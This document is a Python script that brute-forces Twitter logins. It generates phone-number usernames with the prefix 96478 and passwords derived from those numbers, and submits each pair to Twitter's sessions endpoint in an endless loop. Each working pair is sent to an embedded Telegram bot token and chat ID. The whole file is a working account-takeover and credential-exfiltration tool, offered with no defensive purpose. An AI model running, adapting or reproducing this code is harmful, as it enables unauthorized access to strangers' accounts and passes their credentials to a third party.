import requests
import random

red="\033[0;31;40m"
green="\033[0;32;40m"
yellow="\033[0;33;40m"

Words = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
token = (random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words))
ct0 = ''
auth_token = ''
tok="5366139923:AAHpR63XiZmYUGaN0pdONyHYAvNJqze4QlA"
ID="5046952858"

def login(username,password):
	session = requests.Session()
	url = "https://twitter.com/sessions"
	session.headers = {
	"Host": "twitter.com",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	}
	cookies = {
	"_mb_tk":token
	}
	data = {
	"authenticity_token":token,
	"session[username_or_email]":username,
	"session[password]":password
	}
	response = session.post(url, data=data , cookies=cookies)
	r = session.cookies.get_dict()
	try:
		if(r['dnt']):
			return ("Yes")
	except:
		return ("No")
		


while True:
	try:
		user = '1234567890'
		us = str("".join(random.choice(user)for i in range(8)))        
		user="96478"+us
		pas="078"+us
		
		if login(user,pas) == "Yes":
			print(green+user)
			user="Username"+user+": /n password : "+pas
			tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={user}''')
			i = requests.post(tlg)
		else:
			print(red+user)
	except:
		pass